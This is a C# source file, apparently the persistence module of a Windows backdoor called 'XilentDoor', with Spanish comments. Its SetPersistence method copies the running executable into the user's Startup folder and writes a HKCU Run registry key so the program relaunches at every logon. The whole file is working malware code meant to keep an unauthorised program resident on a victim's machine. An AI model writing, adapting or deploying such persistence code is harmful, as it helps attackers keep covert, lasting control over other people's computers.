using System;
using System.IO;
using Microsoft.Win32;

namespace XilentDoor.Core
{
    public static class Persistence
    {
        public static void SetPersistence()
        {
            try
            {
                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                // Copia el archivo .exe al directorio de inicio
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string startupFolder = Path.Combine(userProfile, @"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
                string destFile = Path.Combine(startupFolder, Path.GetFileName(exePath));

                if (!File.Exists(destFile))
                {
                    File.Copy(exePath, destFile);
                }

                // Agrega entrada al registro de Windows
                string registryPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                string registryName = "XilentDoor";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue(registryName, exePath);
                    }
                }
            }
            catch (Exception ex)
            {
                // Manejar errores
                Console.WriteLine($"[!] Error al establecer persistencia: {ex.Message}");
            }
        }
    }
}
